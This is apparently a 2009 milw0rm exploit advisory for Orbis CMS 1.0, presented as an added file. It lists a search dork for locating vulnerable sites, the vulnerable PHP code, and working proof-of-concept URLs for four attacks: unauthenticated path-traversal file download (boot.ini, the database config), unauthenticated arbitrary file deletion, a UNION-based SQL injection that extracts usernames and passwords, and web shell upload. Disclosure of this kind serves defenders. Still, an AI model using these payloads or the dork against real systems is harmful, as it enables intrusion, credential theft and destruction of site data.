@@ -1,0 +1,97 @@
+################################################################################################################################################
+[+] Orbis CMS 1.0 (AFD/ADF/ASU/SQL) Multiple Remote Vulnerabilities
+[+] Discovered By SirGod
+[+] http://insecurity-ro.org
+[+] http://h4cky0u.org
+################################################################################################################################################
+
+[+] Dork : Powered by Orbis CMS
+
+[+] Download script : http://www.novo-ws.com/orbis-cms/download.shtml
+
+[+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Arbitrary File
+Download <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[+]
+
+ - No login required.
+
+ - Vulnerable code in fileman_file_download.php
+
+-----------------------------------------------------------------------------------
+header('Content-Type: application/force-download');
+header('Content-Disposition: attachment; filename="'.basename($_GET['fn']).'"');
+readfile($_GET['fn']);
+-----------------------------------------------------------------------------------
+
+ - PoC's
+
+    http://127.0.0.1/[path]/admin/fileman_file_download.php?fn=../../../../../../../boot.ini
+
+    http://127.0.0.1/path/admin/fileman_file_download.php?fn=includes/config/db.php
+
+
+[+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Arbitrary Delete
+File <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[+]
+
+ - No login required.
+
+ - Vulnerable code in fileman_file_delete.php
+
+-----------------------------------------------------------------------------------------------
+ $filename = $_GET['fn'];
+
+ unlink($filename) or die("Couldn't delete ".$filename.". Please
+contact your web designer.");
+-----------------------------------------------------------------------------------------------
+
+ - PoC
+
+     http://127.0.0.1/[path]/admin/fileman_file_delete.php?fn=../uploads/example.jpg
+
+[+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> SQL Injection
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[+]
+
+ - Login required.
+
+ - Code from editor.php
+
+---------------------------------------------
+<?php require("includes/functions.php"); ?>
+getSectionPage($_GET['s']);
+----------------------------------- ----------
+
+ - Vulnerable code in includes/functions.php
+
+--------------------------------------------------------------------
+function getSectionPage($id) {
+
+ if(isset($id)) {
+  require($_SESSION['inc_dir']."config/db.php");
+  $sc=mysql_query('SELECT * FROM content WHERE id='.$id.'', $db);
+--------------------------------------------------------------------
+
+ - PoC
+
+    http://127.0.0.1/[path]/admin/editor.php?s=null+union+all+select+1,2,3,4,5,concat_ws(0x3a,username,password)+from+security+where+user_id=1--&t=1
+
+
+[+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Arbitrary Shell
+Upload <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<[+]
+
+ - Login required.
+
+
+ 1) Go to
+
+      http://127.0.0.1/[path]/admin/fileman.php
+
+ 2) Select your shell and upload it
+
+      shell.php
+
+ 3) You fill find your shell here
+
+      http://127.0.0.1/[path]/uploads/shell.php
+
+################################################################################################################################################
+
+# milw0rm.com [2009-07-30]
